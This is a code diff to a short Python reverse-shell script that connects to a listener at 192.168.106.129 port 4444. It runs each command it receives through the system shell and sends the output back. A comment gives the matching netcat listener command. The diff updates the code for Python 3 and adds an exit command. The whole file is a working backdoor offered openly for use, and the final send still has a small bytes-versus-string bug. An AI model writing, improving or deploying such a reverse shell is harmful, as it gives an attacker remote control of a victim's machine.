@@ -1,4 +1,4 @@
-import socket 
+import socket
 import subprocess
 
 # nc -vv -l -p 4444
@@ -6,16 +6,18 @@ import subprocess
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True)
 
-
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(('192.168.106.129',4444))
+connection.connect(('192.168.106.129', 4444))
 
-connection.send('\n[+] Connected!!!\n')
+connection.send(b'\n[+] Connected!!!\n')
 
 while True:
-    command = connection.recv(1024)
+    command = connection.recv(1024).decode('utf-8')
+    
+    if command.lower() == 'exit':
+        break
+    
     result = execute_system_command(command)
-    connection.send(result)
-
+    connection.send(str(result, 'utf-8'))
 
 connection.close()
